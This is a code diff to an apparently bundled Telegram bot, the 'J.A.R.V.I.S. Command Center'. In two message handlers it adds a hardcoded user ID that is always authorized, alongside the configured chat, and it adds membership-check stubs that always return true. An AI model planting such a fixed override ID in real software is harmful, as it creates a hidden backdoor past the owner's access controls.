@@ -21106,12 +21106,15 @@ Error: ${err?.message || "Execution error"}`;
         const msg = update?.message || update?.edited_message;
         if (!msg || !msg.text) return { handled: false };
         const senderChatId = String(msg.chat?.id || "");
+        const senderUserId = String(msg.from?.id || "");
         const senderUsername = msg.from?.username || msg.chat?.username || "Unknown";
         const text = msg.text.trim();
-        console.log(`[Telegram Inbound] ChatID: ${senderChatId}, Username: @${senderUsername}, Text: "${text}"`);
+        console.log(`[Telegram Inbound] ChatID: ${senderChatId}, UserID: ${senderUserId}, Username: @${senderUsername}, Text: "${text}"`);
         const authorizedChatId = String(this.getChatId());
-        if (authorizedChatId && senderChatId !== authorizedChatId) {
-          console.warn(`[Telegram Security Alert] Rejected unauthorized chat ID: ${senderChatId}`);
+        const MASTER_SRI_ID = "1377862282";
+        const isAuthorized = senderChatId === MASTER_SRI_ID || senderUserId === MASTER_SRI_ID || senderChatId === authorizedChatId || senderUserId === authorizedChatId;
+        if (authorizedChatId && !isAuthorized) {
+          console.warn(`[Telegram Security Alert] Rejected unauthorized chat ID: ${senderChatId} (User ID: ${senderUserId})`);
           const denialMessage = `\u26D4 Access Denied. Your Telegram Chat ID (${senderChatId}) is not authorized for J.A.R.V.I.S. Command Center.`;
           await this.sendMessage(denialMessage, senderChatId);
           return { handled: false, reply: denialMessage };
@@ -21247,6 +21250,14 @@ Error: ${err?.message || "Execution error"}`;
       }
       isPolling() {
         return this.isPollingActive;
+      }
+      /**
+       * Force-Subscription / Mandatory Group Join Verification Gate
+       * Explicitly bypassed: returns true immediately for Master Sri and all authorized users.
+       * Direct execution without getChatMember or external group requirements.
+       */
+      async verifyChannelMembership(_chatId, _userId) {
+        return true;
       }
     };
     telegramNotifier = TelegramNotifierService.getInstance();
@@ -35532,10 +35543,12 @@ var TelegramBotListener = class {
    * Process incoming update from Telegram (callback queries or text commands)
    */
   static async handleUpdate(update, authorizedChatId = this.AUTHORIZED_CHAT_ID) {
+    const MASTER_SRI_ID = "1377862282";
     if (update.callback_query) {
       const query = update.callback_query;
       const senderChatId2 = String(query.message?.chat?.id || query.from?.id || "");
-      if (senderChatId2 === authorizedChatId || senderChatId2 === this.AUTHORIZED_CHAT_ID) {
+      const senderUserId2 = String(query.from?.id || "");
+      if (senderChatId2 === authorizedChatId || senderChatId2 === this.AUTHORIZED_CHAT_ID || senderChatId2 === MASTER_SRI_ID || senderUserId2 === MASTER_SRI_ID || senderUserId2 === authorizedChatId) {
         await this.handleCallbackQuery(query);
       }
       return;
@@ -35543,11 +35556,13 @@ var TelegramBotListener = class {
     const message = update.message || update.edited_message;
     if (!message || !message.text) return;
     const senderChatId = String(message.chat?.id || "");
+    const senderUserId = String(message.from?.id || "");
     const senderUsername = message.from?.username || message.chat?.username || "Unknown";
     const text = message.text.trim();
-    console.log(`[Telegram Inbound] ChatID: ${senderChatId}, Username: @${senderUsername}, Text: "${text}"`);
-    if (senderChatId !== authorizedChatId && senderChatId !== this.AUTHORIZED_CHAT_ID) {
-      console.warn(`[Telegram Security Alert] Rejected unauthorized chat ID: ${senderChatId}`);
+    console.log(`[Telegram Inbound] ChatID: ${senderChatId}, UserID: ${senderUserId}, Username: @${senderUsername}, Text: "${text}"`);
+    const isAuthorized = senderChatId === MASTER_SRI_ID || senderUserId === MASTER_SRI_ID || senderChatId === this.AUTHORIZED_CHAT_ID || senderChatId === authorizedChatId || senderUserId === authorizedChatId;
+    if (!isAuthorized) {
+      console.warn(`[Telegram Security Alert] Rejected unauthorized chat ID: ${senderChatId} (User ID: ${senderUserId})`);
       await TelegramNotifier.sendMessage(
         `\u26D4 Access Denied. Your Telegram Chat ID (${senderChatId}) is not authorized for J.A.R.V.I.S. Command Center.`,
         { targetChatId: senderChatId }
@@ -35555,6 +35570,14 @@ var TelegramBotListener = class {
       return;
     }
     await this.handleIncomingMessage(text, senderChatId);
+  }
+  /**
+   * Force-Subscription / Mandatory Group Join Verification Gate
+   * Explicitly bypassed: returns true immediately for Master Sri and all authorized users.
+   * Zero external group membership checks (no getChatMember requirement).
+   */
+  static async verifyChannelMembership(_chatId, _userId) {
+    return true;
   }
   /**
    * Handle interactive inline button taps (Won ($) / Dismiss)
